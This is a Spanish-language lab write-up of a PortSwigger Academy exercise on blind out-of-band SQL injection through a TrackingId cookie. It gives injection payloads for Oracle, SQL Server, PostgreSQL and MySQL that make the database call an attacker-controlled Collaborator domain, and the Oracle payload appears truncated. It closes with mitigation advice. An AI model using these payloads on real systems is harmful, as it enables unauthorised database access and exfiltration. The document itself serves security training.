Lab16: Blind SQL injection with out-of-band interaction

Nivel Practitioner
Tipo de SQLi Blind SQL injection (Out-of-band / OAST)

Objetivo

Provocar una interacción de red externa (DNS) mediante una subconsulta SQL, demostrando la capacidad de realizar consultas fuera de banda (out-of-band) desde la base de datos hacia un servidor controlado por el atacante.

Vulnerabilidad

La cookie TrackingId es vulnerable a inyección SQL. El servidor no devuelve errores ni cambios en el contenido, pero procesa comandos que permiten invocar funciones de red. Esto hace que los métodos tradicionales (boolean-based o time-based) no sean efectivos o sean muy lentos.

Los ataques out-of-band (OOB) son una técnica avanzada que se utiliza cuando no hay respuesta directa ni se pueden realizar inferencias por tiempo de manera fiable. El ataque obliga a la base de datos a realizar una solicitud externa (normalmente DNS o HTTP) a un servidor controlado por el atacante.

En este laboratorio, el objetivo es simplemente generar una interacción DNS, no extraer datos. La extracción de datos se aborda en el Laboratorio 17.

Nota importante: Este laboratorio requiere la versión Professional de Burp Suite, ya que utiliza la funcionalidad Burp Collaborator para recibir las interacciones externas. Con la versión Community no es posible completarlo, pero se puede comprender el procedimiento teórico.

Procedimiento (Teórico)

Nota: Al requerir la versión Professional de Burp Suite (elemento con el cual no se cuenta en este entorno educativo), no se pueden adjuntar las evidencias prácticas (capturas). A continuación se explica el procedimiento teórico que se seguiría con Burp Collaborator.

  1. Interceptar la petición con Burp Proxy que contenga la cookie TrackingId. 
    GET / HTTP/1.1
Cookie: TrackingId=xyz123
  2. Abrir Burp Collaborator desde el menú de Burp Suite Professional. Esto genera un subdominio único, por ejemplo: abcdef12345678.oastify.com.
  3. Construir un payload que fuerce a la base de datos a realizar una consulta DNS al subdominio de Collaborator. Dependiendo del motor de base de datos, el payload varía:

    Para Oracle (usando XXE):

    TrackingId=xyz' UNION SELECT extractvalue(xmltype(' %remote;]>'),'/l') FROM dual--

    Para Microsoft SQL Server:

    TrackingId=xyz'; exec master..xp_dirtree '\\abcdef12345678.oastify.com\file'--

    Para PostgreSQL (con extensión dblink):

    TrackingId=xyz'; CREATE EXTENSION IF NOT EXISTS dblink; PERFORM dblink_connect('host=abcdef12345678.oastify.com');--

    Para MySQL (con LOAD_FILE o INTO OUTFILE):

    TrackingId=xyz' UNION SELECT LOAD_FILE('\\\\abcdef12345678.oastify.com\\file')--
  4. Inyectar el payload en la cookie TrackingId y enviar la petición.
  5. Verificar en Burp Collaborator la recepción de interacciones. En la pestaña de Collaborator deberían aparecer consultas DNS o HTTP provenientes del servidor de la base de datos.
  6. Confirmar la vulnerabilidad al ver la interacción en Collaborator, lo que demuestra que la base de datos puede realizar solicitudes externas.

Payload de ejemplo (Oracle)

TrackingId=xyz' UNION SELECT extractvalue(xmltype(' %remote;]>'),'/l') FROM dual--

Explicación del payload (Oracle)

  • xyz': Cierra la cadena original de la cookie TrackingId.
  • UNION SELECT: Combina la consulta original con una consulta maliciosa.
  • extractvalue(): Función de Oracle que procesa XML. Se utiliza para forzar una solicitud externa.
  • xmltype(): Convierte una cadena en tipo XML.
  • %remote;]>: Definición de entidad externa XML que fuerza una petición HTTP al servidor del atacante.
  • FROM dual: Tabla dummy de Oracle necesaria para completar la consulta.
  • --: Comenta el resto de la consulta original.

Funcionamiento

Cuando la base de datos procesa la función extractvalue(), intenta resolver la entidad externa definida en el XML, lo que genera una petición HTTP (o DNS) al servidor especificado (Burp Collaborator). Esta petición es recibida por el atacante, confirmando la ejecución de código y la capacidad de comunicación externa.

Verificación del ataque

La vulnerabilidad se confirmaría al observar en Burp Collaborator las siguientes interacciones:

  • Consultas DNS desde la IP del servidor de la base de datos.
  • Peticiones HTTP al dominio de Collaborator.
  • Registros de conexiones en el cliente de Collaborator.

Esto demostraría que:

  • Es posible ejecutar comandos SQL arbitrarios.
  • La base de datos tiene conectividad a Internet o a la red interna.
  • Se puede utilizar esta técnica para exfiltrar datos (Laboratorio 17).

Una vez confirmada la interacción, el laboratorio mostraría el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Resultado esperado: El laboratorio se resuelve correctamente al generar la interacción out-of-band, demostrando la capacidad de realizar peticiones externas desde la base de datos.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección.

SELECT * FROM tracking WHERE id = ?

Firewall de Base de Datos

Implementar firewalls de base de datos que bloqueen tráfico saliente no autorizado, especialmente hacia Internet. La base de datos no debería tener acceso a Internet a menos que sea estrictamente necesario.

Deshabilitar Funciones Peligrosas

Deshabilitar o restringir funciones que permiten interacciones externas:

  • Oracle: Restringir el uso de UTL_HTTP, UTL_TCP, y funciones XML que permitan entidades externas.
  • Microsoft SQL Server: Deshabilitar xp_cmdshell, xp_dirtree y otras funciones extendidas.
  • PostgreSQL: No instalar extensiones como dblink si no son necesarias.
  • MySQL: Deshabilitar LOAD_FILE y restringir INTO OUTFILE.

Principio de Menor Privilegio

La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos. No debería tener acceso a funciones que permiten interacciones de red.

Segmentación de Red

Segmentar la red para que los servidores de base de datos no tengan acceso directo a Internet. Cualquier comunicación externa debe pasar por proxies controlados y monitoreados.

Validación de Entradas

Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible, rechazar cualquier valor que no cumpla con ese patrón.

Web Application Firewall (WAF)

Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de red y entidades externas XML.
